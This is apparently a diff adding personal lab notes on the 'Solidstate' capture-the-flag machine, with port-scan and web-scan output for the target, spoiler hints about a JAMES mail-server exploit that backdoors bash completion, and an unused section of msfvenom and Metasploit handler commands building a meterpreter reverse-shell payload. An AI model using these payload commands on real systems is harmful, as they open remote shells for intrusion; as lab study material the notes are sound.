@@ -1,0 +1,91 @@
+<h1>Solidstate 10.10.1051</h1>
+
+<h2>User crawl</h2>
+  webadmin@solid-state-security.com
+
+<h2>Metasploit</h2>
+
+  Hosts
+  =====
+
+  address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
+  -------      ---  ----  -------  ---------  -----  -------  ----  --------
+  10.10.10.51             Linux               3.X    server
+
+  host         port   proto  name           state     info
+  ----         ----   -----  ----           -----     ----
+  10.10.10.51  22     tcp    ssh            open      OpenSSH 7.4p1 Debian 10+deb9u1 protocol 2.0
+  10.10.10.51  25     tcp    smtp           open      JAMES smtpd 2.3.2
+  10.10.10.51  80     tcp    http           open      Apache httpd 2.4.25 (Debian)
+  10.10.10.51  110    tcp    pop3           open      JAMES pop3d 2.3.2
+  10.10.10.51  119    tcp    nntp           open      JAMES nntpd posting ok
+  10.10.10.51  179    tcp    bgp            filtered
+  10.10.10.51  631    udp    ipp            unknown
+  10.10.10.51  1001   tcp    webpush        filtered
+  10.10.10.51  1090   udp    ff-fms         closed
+  10.10.10.51  1666   tcp    netview-aix-6  filtered
+  10.10.10.51  3404   tcp    unknown        filtered
+  10.10.10.51  4045   tcp    lockd          filtered
+  10.10.10.51  5353   udp    zeroconf       unknown
+  10.10.10.51  7402   tcp    rtps-dd-mt     filtered
+  10.10.10.51  7938   tcp    lgtomapper     filtered
+  10.10.10.51  8086   tcp    d-s-n          filtered
+  10.10.10.51  9943   tcp    unknown        filtered
+  10.10.10.51  16080  tcp    osxwebadmin    filtered
+  10.10.10.51  17592  udp    unknown        closed
+
+
+<h2>nmap</h2>
+  PORT    STATE SERVICE VERSION
+  22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
+  | ssh-hostkey:
+  |   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
+  |   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
+  |_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (EdDSA)
+  25/tcp  open  smtp    JAMES smtpd 2.3.2
+  |_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.105 [10.10.14.105]),
+  80/tcp  open  http    Apache httpd 2.4.25 ((Debian))
+  | http-methods:
+  |_  Supported Methods: HEAD GET POST OPTIONS
+  |_http-server-header: Apache/2.4.25 (Debian)
+  |_http-title: Home - Solid State Security
+  110/tcp open  pop3    JAMES pop3d 2.3.2
+  119/tcp open  nntp    JAMES nntpd (posting ok)
+
+<h2>uniscan</h2>
+  Directory check:
+  | [+] CODE: 200 URL: http://10.10.10.51/assets/
+  | [+] CODE: 200 URL: http://10.10.10.51/images/
+  =============================================================================
+  | File check:
+  | [+] CODE: 200 URL: http://10.10.10.51/index.html
+  | [+] CODE: 200 URL: http://10.10.10.51/LICENSE.txt
+
+Not running wordpress
+
+<h2>Nikto</h2>
+  Allowed HTTP Methods: HEAD, GET, POST, OPTIONS
+  + OSVDB-3268: /images/: Directory indexing found.
+  + OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
+  + OSVDB-3092: /LICENSE.txt: License file found may identify site software.
+  + OSVDB-3233: /icons/README: Apache default file found.
+
+<h2>netcat<h2>
+  nc -nv 10.10.10.51 119
+    Connection to 10.10.10.51 119 port [tcp/*] succeeded!
+    200 solidstate NNTP Service Ready, posting permitted
+
+Spoilers
+  - The exploit backdoors /etc/bash completion which only runs when a user logs in (sourced by .bashrc)
+  - So you need to log in
+  - Look at what other features the admin panel gives you and how you could use that to gather more info
+
+<h2>msfvenom - not used</h2>
+  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.105 LPORT=4105 -f elf > solidshell.elf
+
+  use exploit/multi/handler
+  set PAYLOAD linux/x86/meterpreter/reverse_tcp
+  set LHOST 10.10.14.105
+  set LPORT 4105
+  set ExitOnSession false
+  exploit -j -z
